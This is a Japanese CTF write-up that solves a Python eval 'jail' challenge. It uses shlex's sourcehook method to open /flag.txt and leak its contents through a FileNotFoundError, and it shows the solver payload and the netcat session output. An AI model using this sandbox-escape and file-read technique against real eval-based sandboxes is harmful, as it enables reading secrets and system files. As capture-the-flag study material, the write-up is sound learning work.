# You've Got Shlex

## 問題
Shlexただそれだけです！

```python
import shlex

code = input("jail >")

if not code.isascii():
    # Why? Because https://alpacahack.com/daily/challenges/super-short-system-exit
    print("Not ascii")
    exit()

if "_" in code:
    print("No dunder methods/attributes")
    exit()

eval(code, {"shlex": shlex, "__builtins__": {}})
```

## 解説
作問者の tchen さん含め、他の方々の writeup では `shlex` に `sys` が含まれていることを利用してシェルを叩いているそうです。
```python
import shlex
print(dir(shlex))
# ['StringIO', '__all__', '__builtins__', '__cached__', '__doc__', '__file__', '__loader__', '__name__', '__package__', '__spec__', '_print_tokens', 'join', 'quote', 'shlex', 'split', 'sys']
```

しかし、実はこの問題は `shlex` のメソッドだけで解くことが可能です。

`shlex` クラスには `sourcehook(filename)` というメソッドが用意されています[^1]。与えられたファイルパスを整形するものですが、何と `open()` までしてくれます。これを利用して `/flag.txt` を読んであげると文字列としての `flag` が手に入ります。

```python
shlex.shlex().sourcehook("/flag.txt")[1].read()
```

これを頑張って `print` します。`print` 関数もビルトイン関数なので直接は使えませんが、`shlex` のソース[^2]を覗いてみるといくつか `print` が使われている箇所がありました **（なお全部使えません）**。

* `_print_tokens(lexer)`: `shlex` オブジェクトに格納されているトークンをすべて `print` する。**制約で `_` のつくコードは使えない + `getattr` がビルトイン関数なので関数名で取得も不可能**
* `shlex.debug` を 1 以上にするとトークンを読む際デバッグログとしてトークンを `print` してくれるらしい。**`eval` 環境内ではオブジェクトのプロパティ直接変更が不可能**

諦めて Gemini に聞いたところ、先程の `shlex.sourcehook(filename)` のエラー文を使おうという賢い提案が返ってきました。~~Gemini 少しだけ見直したかも~~  
`shlex.sourcehook(filename)` が `open()` までしてくれるということは、逆に言えば存在しないファイルパスを渡せばエラー文と一緒に出力してくれるはず、というロジックです。

### Solver

```python
shlex.shlex().sourcehook(shlex.shlex().sourcehook("/flag.txt")[1].read())
```

```
$ nc 34.170.146.252 40548
jail >shlex.shlex().sourcehook(shlex.shlex().sourcehook("/flag.txt")[1].read())
Traceback (most recent call last):
  File "/app/jail.py", line 14, in <module>
    eval(code, {"shlex": shlex, "__builtins__": {}})
    ~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "<string>", line 1, in <module>
  File "/usr/local/lib/python3.14/shlex.py", line 285, in sourcehook
    return (newfile, open(newfile, "r"))
                     ~~~~^^^^^^^^^^^^^^
FileNotFoundError: [Errno 2] No such file or directory: 'Alpaca{*******************************************}\n'
```

[^1]: docs: https://docs.python.org/3/library/shlex.html#shlex.shlex.sourcehook
[^2]: https://github.com/python/cpython/blob/main/Lib/shlex.py
